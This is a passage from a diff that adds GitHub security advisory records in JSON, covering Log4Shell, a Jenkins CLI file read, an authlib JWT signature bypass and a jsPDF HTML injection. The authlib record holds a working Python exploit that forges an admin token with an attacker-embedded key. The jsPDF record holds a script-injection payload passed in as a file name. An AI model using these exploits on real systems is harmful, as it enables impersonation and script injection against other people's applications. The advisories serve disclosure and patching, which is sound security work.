+    "description": "# Summary\n\nLog4j versions prior to 2.16.0 are subject to a remote code execution vulnerability via the ldap JNDI parser.\nAs per [Apache's Log4j security guide](https://logging.apache.org/log4j/2.x/security.html): Apache Log4j2 \u003c=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.16.0, this behavior has been disabled by default.\n\nLog4j version 2.15.0 contained an earlier fix for the vulnerability, but that patch did not disable attacker-controlled JNDI lookups in all situations. For more information, see the `Updated advice for version 2.16.0` section of this advisory.\n\n# Impact\n\nLogging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input. \n\n# Affected versions\n\nAny Log4J version prior to v2.15.0 is affected to this specific issue.\n\nThe v1 branch of Log4J which is considered End Of Life (EOL) is vulnerable to other RCE vectors so the recommendation is to still update to 2.16.0 where possible.\n\n## Security releases\nAdditional backports of this fix have been made available in versions 2.3.1, 2.12.2, and 2.12.3\n\n## Affected packages\nOnly the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.\n\n# Remediation Advice\n\n## Updated advice for version 2.16.0\n\nThe Apache Logging Services team provided updated mitigation advice upon the release of version 2.16.0, which [disables JNDI by default and completely removes support for message lookups](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0).\nEven in version 2.15.0, lookups used in layouts to provide specific pieces of context information will still recursively resolve, possibly triggering JNDI lookups. This problem is being tracked as [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046). More information is available on the [GitHub Security Advisory for CVE-2021-45046](https://github.com/advisories/GHSA-7rjr-3q55-vv33).\n\nUsers who want to avoid attacker-controlled JNDI lookups but cannot upgrade to 2.16.0 must [ensure that no such lookups resolve to attacker-provided data and ensure that the the JndiLookup class is not loaded](https://issues.apache.org/jira/browse/LOG4J2-3221).\n\nPlease note that Log4J v1 is End Of Life (EOL) and will not receive patches for this issue. Log4J v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4J 2.16.0 where possible.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/apache/logging-log4j2",
+    "identifiers": [
+      {
+        "value": "GHSA-jfh8-c2jp-5v3q",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2021-44228",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+      "https://github.com/apache/logging-log4j2/pull/608",
+      "https://github.com/tangxiaofeng7/apache-log4j-poc",
+      "https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0",
+      "https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup",
+      "https://issues.apache.org/jira/browse/LOG4J2-3198",
+      "https://issues.apache.org/jira/browse/LOG4J2-3201",
+      "https://logging.apache.org/log4j/2.x/manual/migration.html",
+      "https://logging.apache.org/log4j/2.x/security.html",
+      "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
+      "http://www.openwall.com/lists/oss-security/2021/12/10/1",
+      "http://www.openwall.com/lists/oss-security/2021/12/10/2",
+      "http://www.openwall.com/lists/oss-security/2021/12/10/3",
+      "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
+      "https://issues.apache.org/jira/browse/LOG4J2-3214",
+      "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html",
+      "http://www.openwall.com/lists/oss-security/2021/12/13/1",
+      "http://www.openwall.com/lists/oss-security/2021/12/13/2",
+      "https://issues.apache.org/jira/browse/LOG4J2-3221",
+      "https://github.com/advisories/GHSA-7rjr-3q55-vv33",
+      "https://cert-portal.siemens.com/productcert/pdf/ssa-661247.pdf",
+      "https://lists.debian.org/debian-lts-announce/2021/12/msg00007.html",
+      "https://twitter.com/kurtseifried/status/1469345530182455296",
+      "https://www.debian.org/security/2021/dsa-5020",
+      "http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html",
+      "http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html",
+      "http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
+      "http://www.openwall.com/lists/oss-security/2021/12/14/4",
+      "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00646.html",
+      "https://www.kb.cert.org/vuls/id/930724",
+      "http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html",
+      "http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html",
+      "http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html",
+      "http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html",
+      "http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html",
+      "http://www.openwall.com/lists/oss-security/2021/12/15/3",
+      "https://cert-portal.siemens.com/productcert/pdf/ssa-714170.pdf",
+      "https://cert-portal.siemens.com/productcert/pdf/ssa-397453.pdf",
+      "https://cert-portal.siemens.com/productcert/pdf/ssa-479842.pdf",
+      "http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html",
+      "http://packetstormsecurity.com/files/165532/Log4Shell-HTTP-Header-Injection.html",
+      "https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md",
+      "http://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html",
+      "http://packetstormsecurity.com/files/165673/UniFi-Network-Application-Unauthenticated-Log4Shell-Remote-Code-Execution.html",
+      "https://www.oracle.com/security-alerts/cpujan2022.html",
+      "https://github.com/cisagov/log4j-affected-db",
+      "https://support.apple.com/kb/HT213189",
+      "https://www.bentley.com/en/common-vulnerability-exposure/be-2022-0001",
+      "https://www.oracle.com/security-alerts/cpuapr2022.html",
+      "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-44228",
+      "https://www.nu11secur1ty.com/2021/12/cve-2021-44228.html",
+      "http://packetstormsecurity.com/files/167794/Open-Xchange-App-Suite-7.10.x-Cross-Site-Scripting-Command-Injection.html",
+      "http://packetstormsecurity.com/files/167917/MobileIron-Log4Shell-Remote-Command-Execution.html",
+      "http://packetstormsecurity.com/files/171626/AD-Manager-Plus-7122-Remote-Code-Execution.html",
+      "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2",
+      "https://security.netapp.com/advisory/ntap-20211210-0007",
+      "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/M5CSVUNV4HWZZXGOKNSK6L7RPM7BOKIB",
+      "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VU57UJDCFIASIO35GC55JMKSRXJMCDFM",
+      "https://github.com/github/advisory-database/pull/5501",
+      "https://packetstormsecurity.com/files/165673/UniFi-Network-Application-Unauthenticated-Log4Shell-Remote-Code-Execution.html",
+      "https://packetstormsecurity.com/files/167794/Open-Xchange-App-Suite-7.10.x-Cross-Site-Scripting-Command-Injection.html",
+      "https://packetstormsecurity.com/files/167917/MobileIron-Log4Shell-Remote-Command-Execution.html",
+      "https://packetstormsecurity.com/files/171626/AD-Manager-Plus-7122-Remote-Code-Execution.html",
+      "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
+      "https://seclists.org/fulldisclosure/2022/Dec/2",
+      "https://seclists.org/fulldisclosure/2022/Jul/11",
+      "https://seclists.org/fulldisclosure/2022/Mar/23",
+      "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-44228",
+      "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/M5CSVUNV4HWZZXGOKNSK6L7RPM7BOKIB",
+      "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VU57UJDCFIASIO35GC55JMKSRXJMCDFM",
+      "http://seclists.org/fulldisclosure/2022/Dec/2",
+      "http://seclists.org/fulldisclosure/2022/Jul/11",
+      "http://seclists.org/fulldisclosure/2022/Mar/23",
+      "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
+    ],
+    "published_at": "2021-12-10T00:40:56Z",
+    "updated_at": "2025-10-22T19:13:26Z",
+    "github_reviewed_at": "2021-12-10T00:40:41Z",
+    "nvd_published_at": "2021-12-10T10:15:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.logging.log4j:log4j-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.13.0, \u003c 2.15.0",
+        "first_patched_version": "2.15.0",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.logging.log4j:log4j-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.4, \u003c 2.12.2",
+        "first_patched_version": "2.12.2",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "com.guicedee.services:log4j-core"
+        },
+        "vulnerable_version_range": "\u003c= 1.2.1.2-jre17",
+        "first_patched_version": null,
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.xbib.elasticsearch:log4j"
+        },
+        "vulnerable_version_range": "= 6.3.2.1",
+        "first_patched_version": null,
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "uk.co.nichesolutions.logging.log4j:log4j-core"
+        },
+        "vulnerable_version_range": "= 2.6.3-CUSTOM",
+        "first_patched_version": null,
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.logging.log4j:log4j-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.0-beta9, \u003c 2.3.1",
+        "first_patched_version": "2.3.1",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.ops4j.pax.logging:pax-logging-log4j2"
+        },
+        "vulnerable_version_range": "\u003e= 1.8.0, \u003c 1.9.2",
+        "first_patched_version": "1.9.2",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.ops4j.pax.logging:pax-logging-log4j2"
+        },
+        "vulnerable_version_range": "\u003e= 1.10.0, \u003c 1.10.8",
+        "first_patched_version": "1.10.8",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.ops4j.pax.logging:pax-logging-log4j2"
+        },
+        "vulnerable_version_range": "\u003e= 1.11.0, \u003c 1.11.10",
+        "first_patched_version": "1.11.10",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.ops4j.pax.logging:pax-logging-log4j2"
+        },
+        "vulnerable_version_range": "\u003e= 2.0.0, \u003c 2.0.11",
+        "first_patched_version": "2.0.11",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+        "score": 10.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      },
+      {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      {
+        "cwe_id": "CWE-502",
+        "name": "Deserialization of Untrusted Data"
+      },
+      {
+        "cwe_id": "CWE-917",
+        "name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "ppkarwasz",
+          "id": 12533274,
+          "node_id": "MDQ6VXNlcjEyNTMzMjc0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/12533274?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ppkarwasz",
+          "html_url": "https://github.com/ppkarwasz",
+          "followers_url": "https://api.github.com/users/ppkarwasz/followers",
+          "following_url": "https://api.github.com/users/ppkarwasz/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ppkarwasz/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ppkarwasz/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ppkarwasz/subscriptions",
+          "organizations_url": "https://api.github.com/users/ppkarwasz/orgs",
+          "repos_url": "https://api.github.com/users/ppkarwasz/repos",
+          "events_url": "https://api.github.com/users/ppkarwasz/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ppkarwasz/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+      "score": 10.0
+    },
+    "epss": {
+      "percentage": 0.94358,
+      "percentile": 0.99959
+    }
+  },
+  {
+    "ghsa_id": "GHSA-6f9g-cxwr-q5jr",
+    "cve_id": "CVE-2024-23897",
+    "url": "https://api.github.com/advisories/GHSA-6f9g-cxwr-q5jr",
+    "html_url": "https://github.com/advisories/GHSA-6f9g-cxwr-q5jr",
+    "summary": "Arbitrary file read vulnerability through the Jenkins CLI can lead to RCE",
+    "description": "Jenkins has a built-in command line interface (CLI) to access Jenkins from a script or shell environment.\n\nJenkins uses the args4j library to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an @ character followed by a file path in an argument with the file’s contents (expandAtFiles). This feature is enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable it.\n\nThis allows attackers to read arbitrary files on the Jenkins controller file system using the default character encoding of the Jenkins controller process.\n\n* Attackers with Overall/Read permission can read entire files.\n\n* Attackers without Overall/Read permission can read the first few lines of files. The number of lines that can be read depends on available CLI commands. As of publication of this advisory, the Jenkins security team has found ways to read the first three lines of files in recent releases of Jenkins without having any plugins installed, and has not identified any plugins that would increase this line count.\n\nBinary files containing cryptographic keys used for various Jenkins features can also be read, with some limitations (see note on binary files below). As of publication, the Jenkins security team has confirmed the following possible attacks in addition to reading contents of all files with a known file path. All of them leverage attackers' ability to obtain cryptographic keys from binary files, and are therefore only applicable to instances where that is feasible.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/jenkinsci/jenkins",
+    "identifiers": [
+      {
+        "value": "GHSA-6f9g-cxwr-q5jr",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-23897",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-23897",
+      "https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314",
+      "http://www.openwall.com/lists/oss-security/2024/01/24/6",
+      "http://packetstormsecurity.com/files/176839/Jenkins-2.441-LTS-2.426.3-CVE-2024-23897-Scanner.html",
+      "http://packetstormsecurity.com/files/176840/Jenkins-2.441-LTS-2.426.3-Arbitrary-File-Read.html",
+      "https://www.jenkins.io/changelog-stable/#v2.440.1",
+      "https://github.com/jenkinsci/jenkins/commit/554f03782057c499c49bbb06575f0d28b5200edb",
+      "https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins",
+      "https://www.vicarius.io/vsociety/posts/the-anatomy-of-a-jenkins-vulnerability-cve-2024-23897-revealed-1",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-23897",
+      "https://github.com/advisories/GHSA-6f9g-cxwr-q5jr"
+    ],
+    "published_at": "2024-01-24T18:31:02Z",
+    "updated_at": "2025-10-22T19:24:55Z",
+    "github_reviewed_at": "2024-01-26T01:56:43Z",
+    "nvd_published_at": "2024-01-24T18:15:09Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.main:jenkins-core"
+        },
+        "vulnerable_version_range": "\u003e= 1.606, \u003c= 2.426.2",
+        "first_patched_version": "2.426.3",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.main:jenkins-core"
+        },
+        "vulnerable_version_range": "= 2.441",
+        "first_patched_version": "2.442",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.jenkins-ci.main:jenkins-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.427, \u003c 2.440.1",
+        "first_patched_version": "2.440.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:A",
+        "score": 9.3
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      },
+      {
+        "cwe_id": "CWE-27",
+        "name": "Path Traversal: 'dir/../../filename'"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "sunSUNQ",
+          "id": 33311698,
+          "node_id": "MDQ6VXNlcjMzMzExNjk4",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33311698?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sunSUNQ",
+          "html_url": "https://github.com/sunSUNQ",
+          "followers_url": "https://api.github.com/users/sunSUNQ/followers",
+          "following_url": "https://api.github.com/users/sunSUNQ/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sunSUNQ/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sunSUNQ/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sunSUNQ/subscriptions",
+          "organizations_url": "https://api.github.com/users/sunSUNQ/orgs",
+          "repos_url": "https://api.github.com/users/sunSUNQ/repos",
+          "events_url": "https://api.github.com/users/sunSUNQ/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sunSUNQ/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.94466,
+      "percentile": 0.99994
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wvwj-cvrp-7pv5",
+    "cve_id": "CVE-2026-27962",
+    "url": "https://api.github.com/advisories/GHSA-wvwj-cvrp-7pv5",
+    "html_url": "https://github.com/advisories/GHSA-wvwj-cvrp-7pv5",
+    "summary": "Authlib JWS JWK Header Injection: Signature Verification Bypass",
+    "description": "## Description\n\n### Summary\n\nA JWK Header Injection vulnerability in `authlib`'s JWS implementation allows an unauthenticated\nattacker to forge arbitrary JWT tokens that pass signature verification. When `key=None` is passed\nto any JWS deserialization function, the library extracts and uses the cryptographic key embedded\nin the attacker-controlled JWT `jwk` header field. An attacker can sign a token with their own\nprivate key, embed the matching public key in the header, and have the server accept the forged\ntoken as cryptographically valid — bypassing authentication and authorization entirely.\n\nThis behavior violates **RFC 7515 §4.1.3** and the validation algorithm defined in **RFC 7515 §5.2**.\n\n### Details\n\n**Vulnerable file:** `authlib/jose/rfc7515/jws.py`  \n**Vulnerable method:** `JsonWebSignature._prepare_algorithm_key()`  \n**Lines:** 272–273\n\n```python\nelif key is None and \"jwk\" in header:\n    key = header[\"jwk\"]   # ← attacker-controlled key used for verification\n```\n\nWhen `key=None` is passed to `jws.deserialize_compact()`, `jws.deserialize_json()`, or\n`jws.deserialize()`, the library checks the JWT header for a `jwk` field. If present, it extracts\nthat value — which is fully attacker-controlled — and uses it as the verification key.\n\n**RFC 7515 violations:**\n\n- **§4.1.3** explicitly states the `jwk` header parameter is **\"NOT RECOMMENDED\"** because keys\n  embedded by the token submitter cannot be trusted as a verification anchor.\n- **§5.2 (Validation Algorithm)** specifies the verification key MUST come from the *application\n  context*, not from the token itself. There is no step in the RFC that permits falling back to\n  the `jwk` header when no application key is provided.\n\n**Why this is a library issue, not just a developer mistake:**\n\nThe most common real-world trigger is a **key resolver callable** used for JWKS-based key lookup.\nA developer writes:\n\n```python\ndef lookup_key(header, payload):\n    kid = header.get(\"kid\")\n    return jwks_cache.get(kid)   # returns None when kid is unknown/rotated\n\njws.deserialize_compact(token, lookup_key)\n```\n\nWhen an attacker submits a token with an unknown `kid`, the callable legitimately returns `None`.\nThe library then silently falls through to `key = header[\"jwk\"]`, trusting the attacker's embedded\nkey. The developer never wrote `key=None` — the library's fallback logic introduced it. The result\nlooks like a verified token with no exception raised, making the substitution invisible.\n\n**Attack steps:**\n\n1. Attacker generates an RSA or EC keypair.\n2. Attacker crafts a JWT payload with any desired claims (e.g. `{\"role\": \"admin\"}`).\n3. Attacker signs the JWT with their **private** key.\n4. Attacker embeds their **public** key in the JWT `jwk` header field.\n5. Attacker uses an unknown `kid` to cause the key resolver to return `None`.\n6. The library uses `header[\"jwk\"]` for verification — signature passes.\n7. Forged claims are returned as authentic.\n\n### PoC\n\nTested against **authlib 1.6.6** (HEAD `a9e4cfee`, Python 3.11).\n\n**Requirements:**\n```\npip install authlib cryptography\n```\n\n**Exploit script:**\n```python\nfrom authlib.jose import JsonWebSignature, RSAKey\nimport json\n\njws = JsonWebSignature([\"RS256\"])\n\n# Step 1: Attacker generates their own RSA keypair\nattacker_private = RSAKey.generate_key(2048, is_private=True)\nattacker_public_jwk = attacker_private.as_dict(is_private=False)\n\n# Step 2: Forge a JWT with elevated privileges, embed public key in header\nheader = {\"alg\": \"RS256\", \"jwk\": attacker_public_jwk}\nforged_payload = json.dumps({\"sub\": \"attacker\", \"role\": \"admin\"}).encode()\nforged_token = jws.serialize_compact(header, forged_payload, attacker_private)\n\n# Step 3: Server decodes with key=None — token is accepted\nresult = jws.deserialize_compact(forged_token, None)\nclaims = json.loads(result[\"payload\"])\nprint(claims)  # {'sub': 'attacker', 'role': 'admin'}\nassert claims[\"role\"] == \"admin\"  # PASSES\n```\n\n**Expected output:**\n```\n{'sub': 'attacker', 'role': 'admin'}\n```\n\n**Docker (self-contained reproduction):**\n```bash\nsudo docker run --rm authlib-cve-poc:latest \\\n  python3 /workspace/pocs/poc_auth001_jws_jwk_injection.py\n```\n\n### Impact\n\nThis is an authentication and authorization bypass vulnerability. Any application using authlib's\nJWS deserialization is affected when:\n\n- `key=None` is passed directly, **or**\n- a key resolver callable returns `None` for unknown/rotated `kid` values (the common JWKS lookup pattern)\n\nAn unauthenticated attacker can impersonate any user or assume any privilege encoded in JWT claims\n(admin roles, scopes, user IDs) without possessing any legitimate credentials or server-side keys.\nThe forged token is indistinguishable from a legitimate one — no exception is raised.\n\nThis is a violation of **RFC 7515 §4.1.3** and **§5.2**. The spec is unambiguous: the `jwk`\nheader parameter is \"NOT RECOMMENDED\" as a key source, and the validation key MUST come from\nthe application context, not the token itself.\n\n**Minimal fix** — remove the fallback from `authlib/jose/rfc7515/jws.py:272-273`:\n```python\n# DELETE:\nelif key is None and \"jwk\" in header:\n    key = header[\"jwk\"]\n```\n\n**Recommended safe replacement** — raise explicitly when no key is resolved:\n```python\nif key is None:\n    raise MissingKeyError(\"No key provided and no valid key resolvable from context.\")\n```",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/authlib/authlib/security-advisories/GHSA-wvwj-cvrp-7pv5",
+    "source_code_location": "https://github.com/authlib/authlib",
+    "identifiers": [
+      {
+        "value": "GHSA-wvwj-cvrp-7pv5",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-27962",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/authlib/authlib/security/advisories/GHSA-wvwj-cvrp-7pv5",
+      "https://github.com/authlib/authlib/commit/a5d4b2d4c9e46bfa11c82f85fdc2bcc0b50ae681",
+      "https://github.com/authlib/authlib/releases/tag/v1.6.9",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27962",
+      "https://github.com/advisories/GHSA-wvwj-cvrp-7pv5"
+    ],
+    "published_at": "2026-03-16T15:17:15Z",
+    "updated_at": "2026-03-16T21:54:00Z",
+    "github_reviewed_at": "2026-03-16T15:17:15Z",
+    "nvd_published_at": "2026-03-16T18:16:07Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "authlib"
+        },
+        "vulnerable_version_range": "\u003c= 1.6.8",
+        "first_patched_version": "1.6.9",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-347",
+        "name": "Improper Verification of Cryptographic Signature"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "Jaynornj",
+          "id": 26265990,
+          "node_id": "MDQ6VXNlcjI2MjY1OTkw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/26265990?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Jaynornj",
+          "html_url": "https://github.com/Jaynornj",
+          "followers_url": "https://api.github.com/users/Jaynornj/followers",
+          "following_url": "https://api.github.com/users/Jaynornj/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Jaynornj/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Jaynornj/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Jaynornj/subscriptions",
+          "organizations_url": "https://api.github.com/users/Jaynornj/orgs",
+          "repos_url": "https://api.github.com/users/Jaynornj/repos",
+          "events_url": "https://api.github.com/users/Jaynornj/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Jaynornj/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "Pr00fOf3xpl0it",
+          "id": 144633680,
+          "node_id": "U_kgDOCJ7vUA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/144633680?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Pr00fOf3xpl0it",
+          "html_url": "https://github.com/Pr00fOf3xpl0it",
+          "followers_url": "https://api.github.com/users/Pr00fOf3xpl0it/followers",
+          "following_url": "https://api.github.com/users/Pr00fOf3xpl0it/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Pr00fOf3xpl0it/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Pr00fOf3xpl0it/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Pr00fOf3xpl0it/subscriptions",
+          "organizations_url": "https://api.github.com/users/Pr00fOf3xpl0it/orgs",
+          "repos_url": "https://api.github.com/users/Pr00fOf3xpl0it/repos",
+          "events_url": "https://api.github.com/users/Pr00fOf3xpl0it/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Pr00fOf3xpl0it/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "score": 9.1
+    },
+    "epss": {
+      "percentage": 0.00064,
+      "percentile": 0.19598
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wfv2-pwc8-crg5",
+    "cve_id": "CVE-2026-31938",
+    "url": "https://api.github.com/advisories/GHSA-wfv2-pwc8-crg5",
+    "html_url": "https://github.com/advisories/GHSA-wfv2-pwc8-crg5",
+    "summary": "jsPDF has HTML Injection in New Window paths",
+    "description": "### Impact\n\nUser control of the `options` argument of the `output` function allows attackers to inject arbitrary HTML (such as scripts) into the browser context the created PDF is opened in. The affected overloads and options are:\n\n* `\"pdfobjectnewwindow\"`: the `pdfObjectUrl` option and the entire options object, which is JSON-serialized and included verbatim in the generated HTML-string.\n* `\"pdfjsnewwindow\"`: the `pdfJsUrl` and `filename` options\n* `\"dataurlnewwindow\"`: the `filename` option\n\nThe vulnerability can be exploited in the following scenario: the attacker provides values for the output options, for example via a web interface. These values are then passed unsanitized (automatically or semi-automatically) to the attack victim. The victim creates and opens a PDF with the attack vector using one of the vulnerable method overloads inside their browser. The attacker can thus inject scripts that run in the victims browser context and can extract or modify secrets from this context.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from 'jspdf';\nconst doc = new jsPDF();\n\nconst payload =  'x\\\"\u003e\u003c/iframe\u003e\u003cscript\u003ewindow.__n=1\u003c/script\u003e\u003ciframe src=\"';\n\ndoc.output('pdfjsnewwindow', {\n  filename: payload,\n  pdfJsUrl: 'viewer.html'\n});\n```\n\n### Patches\nThe vulnerability has been fixed in jspdf@4.2.1.\n\n### Workarounds\nSanitize user input before passing it to the output method.",
+    "type": "reviewed",
+    "severity": "critical",
